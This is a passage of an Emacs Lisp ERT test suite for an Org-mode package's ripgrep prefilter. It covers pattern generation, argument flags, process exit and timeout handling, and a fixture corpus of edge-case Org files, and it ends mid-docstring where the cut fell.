    (should (equal (org-agents--rg-patterns '(property "NEXT_REVIEW"))
                   '("^[ \\t]*:NEXT_REVIEW\\+?:")))
    ;; `^[ \\t]*' rather than `^': a drawer may be indented, and Org reads
    ;; a tab-indented property line inside it.
    (should (string-prefix-p "^[ \\t]*:" (car (org-agents--rg-patterns
                                              '(property "P")))))
    ;; Equality gets the value, bounded to the end of the line.
    (should (equal (org-agents--rg-patterns '(property "STYLE" "habit"))
                   '("^[ \\t]*:STYLE\\+?:[ \\t]+habit[ \\t]*$")))
    ;; A value that is regexp syntax in rg's dialect is quoted for it.
    (should (equal (org-agents--rg-patterns '(property "CODE" "a+b"))
                   '("^[ \\t]*:CODE\\+?:[ \\t]+a\\+b[ \\t]*$")))
    (should (equal (org-agents--rg-patterns '(property "CODE" "alpha(beta)"))
                   '("^[ \\t]*:CODE\\+?:[ \\t]+alpha\\(beta\\)[ \\t]*$")))
    ;; A name that is not a legal Org property key pushes nothing: an Org
    ;; key is `\\S-+' with no colon in it.
    (should (null (org-agents--rg-patterns '(property "A B"))))
    (should (null (org-agents--rg-patterns '(property "A:B"))))
    (should (null (org-agents--rg-patterns '(property ""))))))

(ert-deftest org-agents-test-rg-patterns-property-resolved ()
  "The widened patterns, spelled out, and asserted to be ONE pattern each.
The count is the single largest hazard in the widening.
`org-agents--rg-files' INTERSECTS the patterns a conjunct compiles to, so
returning two would turn the disjunction into a conjunction -- \"spells
`:STATUS:' AND carries `:PROTOTYPE:'\" -- which is catastrophically narrow
and reports nothing about itself.

The alternation is never passed through `org-agents--rg-quote', which
escapes `|', `(' and `)'; the value inside one arm is."
  (let ((org-use-property-inheritance nil))
    (should (equal (org-agents--rg-patterns '(property-resolved "STATUS"))
                   '("(?:^[ \\t]*:STATUS\\+?:|^[ \\t]*:PROTOTYPE\\+?:)")))
    (should (equal (org-agents--rg-patterns
                    '(property-resolved "STATUS" "active"))
                   '("(?:^[ \\t]*:STATUS\\+?:[ \\t]+active[ \\t]*$\
|^[ \\t]*:PROTOTYPE\\+?:)")))
    ;; ONE pattern, both forms.
    (should (= 1 (length (org-agents--rg-patterns
                          '(property-resolved "STATUS")))))
    (should (= 1 (length (org-agents--rg-patterns
                          '(property-resolved "STATUS" "active")))))
    ;; The value is quoted for rg's dialect inside its arm, and the
    ;; alternation's own metacharacters are not.
    (should (equal (org-agents--rg-patterns
                    '(property-resolved "CODE" "a+b"))
                   '("(?:^[ \\t]*:CODE\\+?:[ \\t]+a\\+b[ \\t]*$\
|^[ \\t]*:PROTOTYPE\\+?:)")))
    ;; A value rg cannot carry degrades to the existence arm, which is
    ;; wider and so sound.
    (should (equal (org-agents--rg-patterns
                    '(property-resolved "CODE" "caf\351"))
                   '("(?:^[ \\t]*:CODE\\+?:|^[ \\t]*:PROTOTYPE\\+?:)")))
    ;; A name that is no Org property key pushes nothing at all.
    (should (null (org-agents--rg-patterns '(property-resolved "A B"))))
    (should (null (org-agents--rg-patterns '(property-resolved "A:B"))))
    (should (null (org-agents--rg-patterns '(property-resolved ""))))
    ;; Every pattern is printable ASCII, as every other pattern is.
    (dolist (conjunct '((property-resolved "STATUS")
                        (property-resolved "STATUS" "active")
                        (property-resolved "CODE" "caf\351")))
      (dolist (pattern (org-agents--rg-patterns conjunct))
        (should (equal pattern (encode-coding-string pattern 'us-ascii)))))))

(ert-deftest org-agents-test-rg-patterns-planning ()
  "One pattern per keyword, fixed by the head and independent of every bound.
rg cannot compare dates, so the bounds stay residual and org-ql applies
them.  Dropping a conjunct of org-ql's condition only widens: `there is a
stamp in the period' implies `there is a stamp'."
  (should (equal (org-agents--rg-patterns '(scheduled)) '("SCHEDULED:[ \\t]*<")))
  (should (equal (org-agents--rg-patterns '(deadline)) '("DEADLINE:[ \\t]*<")))
  (should (equal (org-agents--rg-patterns '(closed)) '("CLOSED:[ \\t]*\\[")))
  ;; NOT anchored to the start of the line.  All three keywords may share
  ;; one planning line in any order, so `^[ \\t]*DEADLINE:' would miss
  ;; `CLOSED: [..] DEADLINE: <..>' -- an under-match.
  (dolist (pattern (append (org-agents--rg-patterns '(scheduled))
                           (org-agents--rg-patterns '(deadline))
                           (org-agents--rg-patterns '(closed))))
    (should-not (string-prefix-p "^" pattern)))
  ;; The bracket is required by org-ql too (`org-ql--predicate-ts' cannot
  ;; match without its own regexp matching), so it is free narrowing.
  (should (string-suffix-p "<" (car (org-agents--rg-patterns '(scheduled))))))

(ert-deftest org-agents-test-rg-patterns-heading ()
  "One pattern per literal, and `.' with Unicode mode off.
MEASURED, and the single most surprising result of the exercise: rg's
default Unicode mode makes `.' match a CODEPOINT, so `^\\*+.*Review'
cannot cross an invalid UTF-8 byte and misses a latin-1 file even though
the literal is pure ASCII.  `[^\\n]*' does not fix it either; `(?-u:.)*'
does."
  (should (equal (org-agents--rg-patterns '(heading "Fix the bug"))
                 '("^\\*+(?-u:.)*Fix the bug")))
  ;; org-ql requires ALL literals in ONE heading, which implies that the
  ;; file has a heading line for each of them.  Intersecting the
  ;; per-literal file sets is therefore sound, and it is weaker than
  ;; org-ql's condition -- the correct direction.
  (should (equal (org-agents--rg-patterns '(heading "widget" "spec"))
                 '("^\\*+(?-u:.)*widget" "^\\*+(?-u:.)*spec")))
  ;; The escaper, again where it is load-bearing.
  (should (equal (org-agents--rg-patterns '(heading "Ship it (finally)"))
                 '("^\\*+(?-u:.)*Ship it \\(finally\\)")))
  ;; No pattern may carry a Unicode-mode `.'.
  (dolist (pattern (org-agents--rg-patterns '(heading "Review")))
    (should-not (string-match-p "[^u):]\\*\\'" pattern))
    (should (string-match-p "(\\?-u:\\.)\\*" pattern))))

(ert-deftest org-agents-test-rg-args-pins-the-argument-vector ()
  "The flags, in order, because five measured under-matches are missing flags.
`--regexp' before the pattern so that a literal beginning with `-' -- a
heading such as `* -- notes' -- cannot be read as a flag, and the root
after `--' for the same reason.

This pin is not the coverage for any flag, and must not be mistaken for
it.  It fails for every edit to the vector, correct or not, and its
message names no lost file -- so a developer removing a flag they
believe redundant would simply update it.  The flags that keep the
superset invariant are covered by OUTCOME tests over the fixture
corpus, `org-agents-test-rg-covers-*', each of which names the file it
loses.  The vector is also not the whole story: ripgrep prepends the
contents of RIPGREP_CONFIG_PATH to it, and
`org-agents-test-rg-run-unsets-the-ripgrep-config-variable' is what
pins that away."
  (let ((args (org-agents--rg-args "PAT" "/corpus")))
    (should (equal args '("--files-with-matches" "--null" "--ignore-case"
                          "--text" "--crlf" "--no-ignore" "--hidden"
                          "--follow" "--iglob" "*.org"
                          "--regexp" "PAT" "--" "/corpus")))
    ;; Each flag, named with the under-match it prevents, so that removing
    ;; one fails here as well as in the soundness suite.
    (dolist (flag '(;; org-ql's `heading' binds `case-fold-search' t in its
                    ;; own body, and `org-entry-get' is case-insensitive
                    ;; over property names in both directions.
                    "--ignore-case"
                    ;; An .org file holding a NUL is still an Org file.
                    "--text"
                    ;; Without it `$' cannot match before a CRLF, and the
                    ;; value pattern misses every CRLF file.
                    "--crlf"
                    ;; `directory-files-recursively' honours no ignore
                    ;; file and descends into dot-directories.
                    "--no-ignore" "--hidden"
                    ;; It lists a symlink to a file outside the tree, and
                    ;; org-ql matches through it.
                    "--follow"
                    ;; `case-fold-search' is t, so its regexp matches
                    ;; NOTES.ORG, which `--glob' would not.
                    "--iglob"
                    ;; A newline in a file name must not split one path.
                    "--null"))
      (should (member flag args)))
    (should-not (member "--glob" args))))

(defun org-agents-test--fake-rg (path &rest lines)
  "Write an executable shell script at PATH whose body is LINES."
  (with-temp-file path
    (insert "#!/bin/sh\n")
    (dolist (line lines) (insert line "\n")))
  (set-file-modes path #o755)
  path)

(ert-deftest org-agents-test-rg-run-no-match-is-an-answer ()
  "Exit 1 means ripgrep answered, and no file matches.  That is an ANSWER.
Reporting it as a missing prefilter is the defect this backend exists to
remove: the bridge it replaces returned nil for a failure and for a
genuinely empty answer alike, so an agent matching nothing at all was
reported as unconfigured."
  (let* ((dir (make-temp-file "org-agents-rg" t))
         (org-agents-rg-executable
          (org-agents-test--fake-rg (expand-file-name "rg" dir) "exit 1")))
    (unwind-protect
        (let ((msgs (org-agents-test--messages
                     (should (null (org-agents--rg-run "PAT" dir))))))
          ;; A `listp' test tells the two apart exactly: `(listp nil)' is t
          ;; and `(listp (quote unavailable))' is nil.
          (should (listp (org-agents--rg-run "PAT" dir)))
          (should-not (cl-find-if (lambda (m) (string-match-p "org-agents" m))
                                  msgs)))
      (delete-directory dir t))))

(ert-deftest org-agents-test-rg-run-failure-is-not-an-answer ()
  "Exit 2 discards whatever was printed, and says so once.
MEASURED: with one unreadable file among two, rg prints the readable
match, writes `Permission denied' to stderr, AND exits 2 -- so the
printed answer is missing a file.  A partial answer is exactly the
unsound direction."
  (let* ((dir (make-temp-file "org-agents-rg" t))
         (org-agents-rg-executable
          (org-agents-test--fake-rg
           (expand-file-name "rg" dir)
           "printf '/some/real/file.org\\0'"
           "echo 'rg: /x: Permission denied' >&2"
           "exit 2")))
    (unwind-protect
        (let (result)
          (let ((msgs (org-agents-test--messages
                       (setq result (org-agents--rg-run "PAT" dir)))))
            (should (eq result 'unavailable))
            (should-not (listp result))
            (should (cl-find-if (lambda (m)
                                  (and (string-match-p "org-agents" m)
                                       (string-match-p "Permission denied" m)))
                                msgs))))
      (delete-directory dir t))))

(ert-deftest org-agents-test-rg-run-unsets-the-ripgrep-config-variable ()
  "The child must not inherit RIPGREP_CONFIG_PATH, and this needs no ripgrep.
ripgrep prepends every argument in the file that variable names to its
command line, and the vector overrides only the flags it repeats --
`--max-depth', `--max-filesize', `--pre', `--encoding' and `--glob' are
not among them.  So a user's personal ripgrep defaults, which is what
ripgrep's own README recommends the variable for, would silently narrow
or empty the candidate set: a file the prefilter does not report is a
file org-ql never opens.

The fake ripgrep here reports the variable's state through its EXIT
STATUS, which `org-agents--rg-run' already distinguishes exactly: exit 1
is \"an answer, and no file matches\" and answers `nil', while exit 2 is
a failure and answers `unavailable'.  So `nil' here means the child saw
no variable.  See `org-agents-test-rg-covers-a-subdirectory-under-a-user-rg-config'
for the outcome half, which shows the file that is lost without this."
  (let* ((dir (make-temp-file "org-agents-rg" t))
         (org-agents-rg-executable
          (org-agents-test--fake-rg
           (expand-file-name "rg" dir)
           ;; Set, however it is spelled, is a failure; unset is exit 1.
           "if [ -n \"${RIPGREP_CONFIG_PATH+set}\" ]; then exit 2; fi"
           "exit 1")))
    (unwind-protect
        (let ((process-environment
               (cons (concat "RIPGREP_CONFIG_PATH="
                             (expand-file-name "ripgreprc" dir))
                     process-environment)))
          ;; The ambient environment really does carry it, so the
          ;; assertion below cannot pass for want of anything to unset.
          (should (getenv "RIPGREP_CONFIG_PATH"))
          (should (null (org-agents--rg-run "PAT" dir))))
      (delete-directory dir t))))

(ert-deftest org-agents-test-rg-run-times-out-and-does-not-hang ()
  "A prefilter that never answers must not take Emacs with it.
The stub genuinely hangs -- `sleep 30' -- so this test is the thing the
issue asked for rather than a simulation of it.  Nothing bounded the old
`call-process': on an unresponsive filesystem, or under `--follow' over a
pathological symlink arrangement, it returned when the child felt like
it.  MEASURED, and it is why the fix is not a timer: a `run-at-time' set
before a `call-process' to a hanging child NEVER FIRES -- Emacs does not
run timers while blocked there -- while one set before a deadline loop
over `accept-process-output' fires at +0.57 s.  So the bound has to be an
asynchronous process, which is what `org-agents--rg-run' now spawns.

An expiry is `unavailable', which is the answer that already means \"no
answer\": the caller falls back to the live scan it would have used with
no ripgrep at all.  So the price of a spurious expiry is a slow correct
answer, never a wrong one, which is what makes a bound safe to have."
  (let* ((dir (make-temp-file "org-agents-rg" t))
         (org-agents-rg-executable
          (org-agents-test--fake-rg (expand-file-name "rg" dir) "sleep 30"))
         (org-agents-rg-timeout 0.3))
    (unwind-protect
        (let ((t0 (float-time)) result msgs)
          (setq msgs (org-agents-test--messages
                       (setq result (org-agents--rg-run "PAT" dir))))
          (should (eq result 'unavailable))
          ;; The bound is the point: without it this is 30 s.
          (should (< (- (float-time) t0) 5))
          (should (cl-find-if (lambda (m)
                                (and (string-match-p "org-agents" m)
                                     (string-match-p "timed out" m)))
                              msgs)))
      (delete-directory dir t))))

(ert-deftest org-agents-test-rg-run-answers-a-child-already-reaped ()
  "A run that SUCCEEDED before the wait began is still an answer.
This is the sharp edge of an asynchronous prefilter and it was a live
defect: MEASURED, `accept-process-output' given the PROCESS argument
returns INSTANTLY and never delivers that process's sentinel once the
child has already been reaped -- 1.8 million iterations in 3.5 s of hot
spin, and then a correct answer discarded as an expiry, with
`org-agents: rg timed out' in the echo area.  Every pattern this package
builds is answered in milliseconds on a warm corpus, so the window is
the common case rather than a corner: anything that delays the loop's
first call -- GC, another timer, a busy machine -- lands in it.  It was
caught in the wild as two different full-suite tests failing at exactly
30 s, the default bound.

The trigger here is DETERMINISTIC rather than a race run many times: the
`make-process' stub spins in pure Elisp after spawning, which runs no
timers, no sentinels and no process output, so the child exits and is
reaped with its sentinel undelivered -- the exact state the wait loop
used to meet.  Both halves of the fix are asserted: PROCESS nil, so the
sentinel arrives at all, and the bounded drain after the loop, without
which the buffer read here is still EMPTY and a matching run answers
\"no file matches\"."
  (let* ((dir (make-temp-file "org-agents-rg" t))
         (org-agents-rg-executable
          (org-agents-test--fake-rg (expand-file-name "rg" dir)
                                    "printf '/c/a.org\\0'"))
         (org-agents-rg-timeout 3)
         result msgs (t0 nil) (elapsed nil))
    (unwind-protect
        (cl-letf* ((real (symbol-function 'make-process))
                   ((symbol-function 'make-process)
                    (lambda (&rest args)
                      (let ((proc (apply real args)))
                        (let ((stop (+ (float-time) 0.5)))
                          (while (< (float-time) stop) nil))
                        proc))))
          (setq t0 (float-time))
          (setq msgs (org-agents-test--messages
                       (setq result (org-agents--rg-run "PAT" dir))))
          (setq elapsed (- (float-time) t0))
          ;; The answer, and the whole answer.  `unavailable' here is the
          ;; defect, and so is nil -- an empty buffer read before the
          ;; drain reports "no file matches" for a run that matched.
          (should (equal result '("/c/a.org")))
          ;; And it did not burn the bound to get there.
          (should (< elapsed 2))
          (should-not (cl-find-if (lambda (m) (string-match-p "timed out" m))
                                  msgs)))
      (delete-directory dir t))))

(ert-deftest org-agents-test-rg-run-honours-no-timeout ()
  "Nil is no bound, and it is honoured rather than quietly floored.
The option exists so that someone on a slow but working filesystem can
turn the bound off; a nil that silently became 30 would make that
setting a lie.  The child here exits at once, so nil costs this test
nothing -- what is asserted is that the deadline loop does not treat a
nil bound as an immediately expired one, which would turn every
prefilter run into `unavailable'."
  (let* ((dir (make-temp-file "org-agents-rg" t))
         (org-agents-rg-executable
          (org-agents-test--fake-rg (expand-file-name "rg" dir) "exit 1"))
         (org-agents-rg-timeout nil))
    (unwind-protect
        (should (null (org-agents--rg-run "PAT" dir)))
      (delete-directory dir t))))

(ert-deftest org-agents-test-rg-run-reports-a-signal-and-a-spawn-failure ()
  "A process that DIED must fall to the failure branch, not slip past it.
The sharp case, and it is real rather than contrived: MEASURED, a child
killed by SIGHUP reports `(process-status proc)' = `signal' and
`(process-exit-status proc)' = **1** -- because for a signal death the
\"exit status\" IS the signal number.  So exit status alone cannot tell a
death from ripgrep's own exit 1, and exit 1 is the answer meaning \"no
file matches\".  Read that way, an agent whose prefilter was killed would
render NOTHING, with no error and no message, which is the silent
under-match this whole backend exists to prevent.  The guard is testing
`process-status' as well as the code, and this test is what says so.

The stub kills itself rather than stubbing `make-process': a real signal
death exercises the real status pair, where a stub would be asserting
against whatever shape the test author imagined.

The old spelling of this hazard was `call-process' answering with the
STRING \"Killed: 9\", which is why the code used to test `(eq code 0)' and
`(eq code 1)' rather than `(> code 1)'.  The asynchronous form reports a
death through `process-status' instead; the hazard is the same one and
the test still covers it.

Failure to spawn at all is the second half.  MEASURED: `make-process' on
a missing program signals `file-missing', exactly as `call-process' did,
so this path is unchanged by the rewrite."
  (let ((dir (make-temp-file "org-agents-rg" t)))
    (unwind-protect
        (progn
          (let* ((org-agents-rg-executable
                  (org-agents-test--fake-rg (expand-file-name "rg" dir)
                                            "kill -HUP $$"))
                 result)
            (let ((msgs (org-agents-test--messages
                          (setq result (org-agents--rg-run "PAT" dir)))))
              (should (eq result 'unavailable))
              ;; Not nil, which is what a bare `(eq code 1)' would answer.
              (should-not (listp result))
              (should (cl-find-if (lambda (m) (string-match-p "org-agents" m))
                                  msgs))))
          ;; Failure to spawn at all is reported like any other failure
          ;; rather than signalling out of an agent update.
          (let ((org-agents-rg-executable "no-such-program-xyzzy-s2")
                result)
            (let ((msgs (org-agents-test--messages
                          (setq result (org-agents--rg-run "PAT" dir)))))
              (should (eq result 'unavailable))
              (should (cl-find-if (lambda (m) (string-match-p "org-agents" m))
                                  msgs)))))
      (delete-directory dir t))))

(ert-deftest org-agents-test-rg-run-spawns-in-a-live-local-directory ()
  "A deleted `default-directory' makes the spawn signal; a remote one
would run the binary on another host, against files that are not the
corpus.  So the process is spawned from `temporary-file-directory'.

The stub is on `make-process', which is what the bounded prefilter
spawns with; it was `call-process' while the run was synchronous."
  (let* ((dir (make-temp-file "org-agents-rg" t))
         (org-agents-rg-executable
          (org-agents-test--fake-rg (expand-file-name "rg" dir) "exit 1"))
         (seen nil))
    (unwind-protect
        (cl-letf* ((real (symbol-function 'make-process))
                   ((symbol-function 'make-process)
                    (lambda (&rest args)
                      (push default-directory seen)
                      (apply real args))))
          (let ((default-directory "/nonexistent-dir-xyz/"))
            (should (listp (org-agents--rg-run "PAT" dir))))
          (let ((default-directory "/ssh:host:/tmp/")
                (file-name-handler-alist nil)
                (tramp-mode nil))
            (should (listp (org-agents--rg-run "PAT" dir))))
          (should (equal seen (list temporary-file-directory
                                    temporary-file-directory))))
      (delete-directory dir t))))

(ert-deftest org-agents-test-rg-run-reads-nul-separated-paths ()
  "Paths arrive NUL-terminated, so a newline in a name cannot split one.
MEASURED: split on \"\\n\" instead, and a file named `weird\\nname.org'
arrives as the two fragments `weird' and `name.org', neither of which is
a file -- and the real file is dropped from the candidate set."
  (let* ((dir (make-temp-file "org-agents-rg" t))
         (org-agents-rg-executable
          (org-agents-test--fake-rg
           (expand-file-name "rg" dir)
           "printf '/c/weird\\nname.org\\0/c/b.org\\0'")))
    (unwind-protect
        (should (equal (org-agents--rg-run "PAT" dir)
                       '("/c/weird\nname.org" "/c/b.org")))
      (delete-directory dir t))))

(ert-deftest org-agents-test-rg-files-intersects-and-short-circuits ()
  "Several patterns are ANDed by INTERSECTING their file sets, never by
concatenating them into one pattern: org-ql's `and' is order-free and
per-line, and a single pattern demanding both on one line loses every
file whose witnesses are on different lines.  A run that answers with
nothing ends the walk: there is nothing left to intersect."
  (let* ((dir (make-temp-file "org-agents-rg" t))
         (calls 0)
         (answers '(("/c/a.org" "/c/b.org") ("/c/b.org" "/c/x.org"))))
    (unwind-protect
        (cl-letf (((symbol-function 'org-agents--rg-run)
                   (lambda (&rest _)
                     (prog1 (nth calls answers) (cl-incf calls)))))
          (should (equal (org-agents--rg-files
                          '((property "A") (property "B")) dir)
                         '("/c/b.org")))
          (should (= calls 2))
          ;; An empty intersection stops immediately.
          (setq calls 0 answers '(nil ("/c/b.org")))
          (should (null (org-agents--rg-files
                         '((property "A") (property "B")) dir)))
          (should (= calls 1))
          ;; One failed run poisons the whole prefilter: an intersection
          ;; missing a term would be sound, but a partial answer from a
          ;; broken tool is not a thing to build on.
          (setq calls 0 answers '(("/c/a.org") unavailable))
          (should (eq 'unavailable
                      (org-agents--rg-files
                       '((property "A") (property "B")) dir)))
          ;; No conjunct offered a pattern: `t', which is not an answer and
          ;; must not be read as the empty one.
          (setq calls 0)
          (should (eq t (org-agents--rg-files '((todo) (tags "x")) dir)))
          (should (= calls 0)))
      (delete-directory dir t))))

;;; The soundness fixture

;; One hazard per file, so that a superset failure names the hazard that
;; broke it.  A single-file corpus could not: its candidate set is
;; everything or nothing, and the superset relation would hold without
;; distinguishing a prefilter that narrows from one that does nothing.

(defconst org-agents-test--rg-corpus
  '(("prop.org" . "\
* TODO Review the widget
:PROPERTIES:
:NEXT_REVIEW: [2024-01-15 Mon]
:STYLE: habit
:END:
")
    ;; The only NEXT_REVIEW here is on a DONE entry, so the residual
    ;; `(todo)' rejects it while the pushed conjunct keeps its file:
    ;; proof that the candidate set is allowed to be wider.
    ("prop-done.org" . "\
* DONE Retired widget
:PROPERTIES:
:NEXT_REVIEW: [2024-01-15 Mon]
:END:
")
    ;; `:TOKENS+:' with no plain `:TOKENS:' line at all.  MEASURED:
    ;; `org-entry-get' answers \"beta\" here and org-ql matches
    ;; `(property \"TOKENS\")', so a pattern anchored on `:TOKENS:'
    ;; misses the file.
    ("prop-accum.org" . "\
* TODO Accumulated only
:PROPERTIES:
:TOKENS+: beta
:END:
")
    ;; The drawer spells the name in lower case.  MEASURED:
    ;; `org-entry-get' is case-insensitive over property names in both
    ;; directions.
    ("prop-case.org" . "\
* TODO Lower-case property name
:PROPERTIES:
:next_review: [2024-02-02 Fri]
:END:
")
    ;; An indented drawer with a TAB-indented property line inside it.
    ;; MEASURED: Org reads both.
    ("prop-indent.org" . "\
* TODO Indented drawer
   :PROPERTIES:
\t:NEXT_REVIEW: [2024-03-03 Sun]
   :END:
")
    ;; A value carrying whitespace, which is what makes the downgrade to
    ;; existence load-bearing rather than decorative.
    ("prop-spaced-value.org" . "\
* TODO Spaced value
:PROPERTIES:
:OWNER: Jane Doe
:END:
")
    ;; Two values that are regexp syntax in rg's dialect.  `a+b' catches
    ;; an implementation that does not quote at all; `alpha(beta)'
    ;; catches one that quotes with Emacs `regexp-quote', which leaves
    ;; `(' alone because Emacs spells a group `\\('.
    ("value-regexp.org" . "\
* TODO Plus value
:PROPERTIES:
:CODE: a+b
:END:
* TODO Paren value
:PROPERTIES:
:PAREN: alpha(beta)
:END:
")
    ;; Two pushable conjuncts satisfied by one entry, so an intersection
    ;; can be told apart from a union.
    ("two-props.org" . "\
* TODO Both conjuncts here
:PROPERTIES:
:NEXT_REVIEW: [2024-01-15 Mon]
:STYLE: habit
:END:
")
    ;; The literal sits behind a TODO keyword, a priority cookie and
    ;; tags.  org-ql compares against the cleaned title `[#A] Review
    ;; widget spec'; the pattern matches the raw line, which is wider.
    ("head.org" . "\
* TODO [#A] Review widget spec :work:urgent:
* Heading with 50%_done in it
")
    ;; The heading differs in CASE from the query.
    ("head-case.org" . "\
* review the gadget
")
    ;; Parentheses in a heading literal: pushed by the splitter, and
    ;; regexp syntax to rg though not to Emacs.
    ("head-paren.org" . "\
* TODO Review (draft) of plans
")
    ;; Regexp metacharacters, which org-ql `regexp-quote's and the
    ;; emitter escapes for ripgrep, so the literal is sought as text on
    ;; both sides.
    ("head-regexp.org" . "\
* Rev.*iew of plans
* Ship it {maybe} or not
")
    ;; The ONE heading shape whose reassembled title is not spelled by
    ;; the raw line: a priority cookie followed by more than one space.
    ;; MEASURED: `(org-get-heading t t)' here is `[#A] Collapsed review'
    ;; -- `org-get-heading' `mapconcat's the regexp's groups with a
    ;; single space rather than slicing the line -- so org-ql matches the
    ;; literal `[#A] Collapsed' which appears nowhere in the file.  This
    ;; is the witness for the `]' that `org-agents--heading-literals-p'
    ;; refuses, and it is why that guard cannot simply be dropped.
    ("head-collapse.org" . "\
* [#A]   Collapsed review
")
    ;; The three planning keywords, a leap day, and a repeater.
    ("plan.org" . "\
* TODO Leap review
SCHEDULED: <2024-02-29 Thu>
* TODO Repeating chore
SCHEDULED: <2024-02-29 Thu +1w>
* TODO Ship it
DEADLINE: <2024-06-30 Sun>
* DONE Shipped
CLOSED: [2024-03-01 Fri]
")
    ;; An indented planning line, which `org-adapt-indentation' writes.
    ("plan-indent.org" . "\
* TODO Indented planning
   SCHEDULED: <2024-04-04 Thu>
")
    ;; All three keywords on ONE line, in an order that puts DEADLINE
    ;; second.  An anchored planning pattern misses this file.
    ("plan-shared-line.org" . "\
* DONE Shared planning line
CLOSED: [2024-05-05 Sun] DEADLINE: <2024-05-01 Wed> SCHEDULED: <2024-04-30 Tue>
")
    ;; The pattern's text in ordinary body prose, in no drawer at all.
    ;; MEASURED: Org reads it as a paragraph and org-ql does not match
    ;; this file.  rg does.  That over-match must be harmless.
    ("prose.org" . "\
* Notes on the review protocol
Every entry gets a
:NEXT_REVIEW: [2024-01-15 Mon]
line in its body text, or so the convention says.
")
    ;; A canary: BOTH sides must answer \"no match\".  If org-ql ever
    ;; begins answering `(property N)' out of file-level properties, the
    ;; pattern must learn `#+PROPERTY:' the same day.
    ("fileprop.org" . "\
#+PROPERTY: FILEPROP fromfile

* Sees FILEPROP only by inheritance
")
    ;; A CRLF file with a value to compare.  Without `--crlf', `$' cannot
    ;; match before the carriage return and the value pattern misses it.
    ("crlf.org" . "\
* TODO Windows widget\r
:PROPERTIES:\r
:OWNER: Jane\r
:END:\r
")
    ;; Matches nothing, so the prefilter can be shown to narrow at all.
    ("filler.org" . "\
* Nothing to see here
")
    ("sub/scoped.org" . "\
* TODO Scoped review
:PROPERTIES:
:NEXT_REVIEW: [2024-05-05 Sun]
:END:
")
    ;; A subdirectory whose NAME is glob syntax.  MEASURED: rg
    ;; `--glob 'sub{1}/**'' answers with no files at all for it, which is
    ;; why the directory is made rg's ROOT and never a glob.
    ("sub{1}/braced.org" . "\
* TODO Braced directory review
:PROPERTIES:
:NEXT_REVIEW: [2024-06-06 Thu]
:END:
")
    ;; `directory-files-recursively' lists a dot-file; rg skips one by
    ;; default.
    (".stealth.org" . "\
* TODO Hidden file review
:PROPERTIES:
:NEXT_REVIEW: [2024-07-07 Sun]
:END:
")
    ;; Named by a `.ignore' file, which rg honours everywhere.
    ("ignored.org" . "\
* TODO Ignored file review
:PROPERTIES:
:NEXT_REVIEW: [2024-08-08 Thu]
:END:
")
    ;; Named by a `.gitignore', which rg honours inside a git repository
    ;; -- and the author's corpus is one.  The fixture makes a bare
    ;; `.git' directory so the rule applies here too.
    ("gitignored.org" . "\
* TODO Gitignored file review
:PROPERTIES:
:NEXT_REVIEW: [2024-09-09 Mon]
:END:
")
    ;; An upper-case extension.  MEASURED: `case-fold-search' is t, so
    ;; `directory-files-recursively' with \"\\\\.org\\\\'\" LISTS this
    ;; file while rg's `--glob '*.org'' does not.
    ("UPPER.ORG" . "\
* TODO Upper-case extension review
:PROPERTIES:
:NEXT_REVIEW: [2024-10-10 Thu]
:END:
")
    ;; A NUL byte in the body, BEFORE a later heading and drawer.
    ;; MEASURED: without `--text' rg stops at the NUL and reports nothing
    ;; for this file, while Org reads it and org-ql matches.
    ("nul.org" . "\
* TODO First entry
Body with a NUL: \0 and more text.
* TODO Review after the nul
:PROPERTIES:
:NEXT_REVIEW: [2024-12-12 Thu]
:END:
")
    ;; A `.org' file inside a DOT-DIRECTORY, which is a different hazard
    ;; from `.stealth.org' above and the one that actually discriminates.
    ;; MEASURED: an inclusive `--iglob '*.org'' outranks ripgrep's
    ;; ignore and hidden rules for a FILE, so `.stealth.org',
    ;; `ignored.org' and `gitignored.org' are all still reported with
    ;; `--hidden' and `--no-ignore' removed -- but a file under a hidden
    ;; or ignored DIRECTORY is not, because the directory is never
    ;; descended into and the glob never gets to speak.  Without this
    ;; fixture and the next, dropping either flag broke the superset
    ;; invariant while the whole suite stayed green except for the
    ;; argument-vector pin.
    (".hidden/inhidden.org" . "\
* TODO Review inside a hidden directory
:PROPERTIES:
:NEXT_REVIEW: [2024-12-20 Fri]
:END:
")
    ;; The same hazard through `.gitignore' rather than a leading dot:
    ;; the control below names the DIRECTORY, so `--no-ignore' is what
    ;; makes ripgrep descend into it.
    ("gitignored-dir/inside.org" . "\
* TODO Review inside an ignored directory
:PROPERTIES:
:NEXT_REVIEW: [2024-12-21 Sat]
:END:
")
    ;; The prototype pair, for the widened alternation.  The MASTER spells
    ;; the value locally, so it is found by the NAME arm; the FOLLOWER's
    ;; drawer holds only `:PROTOTYPE:' and its file holds no `:STATUS:'
    ;; text anywhere at all, so it is found by the PROTOTYPE arm and by
    ;; nothing else.  That is the file whose loss the widening exists to
    ;; prevent.
    ("proto-master.org" . "\
* TODO Master out in the corpus
:PROPERTIES:
:STATUS: active
:END:
")
    ("proto-follower.org" . "\
* TODO Reads its status through a master
:PROPERTIES:
:PROTOTYPE: Task
:END:
")
    ;; A property value with TRAILING WHITESPACE after it.  `org-entry-get'
    ;; trims, and answers \"habit\", so org-ql matches
    ;; `(property \"STYLE\" \"habit\")' here -- while a value pattern
    ;; ending `habit$' rather than `habit[ \\t]*$' does not match the
    ;; line.  This is the fixture that makes the `[ \\t]*' tail of the
    ;; value pattern fail as a LOST FILE rather than only as a
    ;; string-equality pin.
    ("prop-trailing.org" . "\
* TODO Review with a trailing space
:PROPERTIES:
:STYLE: habit \n:END:
")
    ;; Controls, not part of the base file set.
    (".ignore" . "ignored.org\n")
    (".gitignore" . "gitignored.org\ngitignored-dir/\n"))
  "Fixture files for the soundness suite: relative name . contents.")

(defconst org-agents-test--rg-corpus-count 33
  "How many `.org' files `org-agents-test--with-rg-corpus' reliably shows.
Thirty-two from the manifest, plus the latin-1 file the macro builds.
`link.org' is a thirty-fourth that is deliberately NOT counted: see the
macro for the platform quirk that makes its presence in the base file set
intermittent, and why that costs the suite nothing.

The fixture asserts this, because a fixture that quietly stops being
materialised makes every soundness assertion below hold vacuously -- the
failure mode that made the database suite it replaces worthless.")

(defmacro org-agents-test--with-rg-corpus (&rest body)
  "Materialise the soundness fixture corpus and run BODY.
Binds `dir' (the corpus root), `outside' (the directory holding the
symlink target), `paths' (the base file set, enumerated with
`directory-files-recursively' rather than read out of the manifest, so
that a fixture the manifest forgets is still covered) and `F' (a
function from a relative name to its absolute path AS WRITTEN -- not a
truename: the symlink fixture depends on org-ql being handed the base
spelling).

`org-directory' is the corpus, so no test can reach the developer's own;
`org-agenda-files' is nil, so a scope cannot leak into one; property
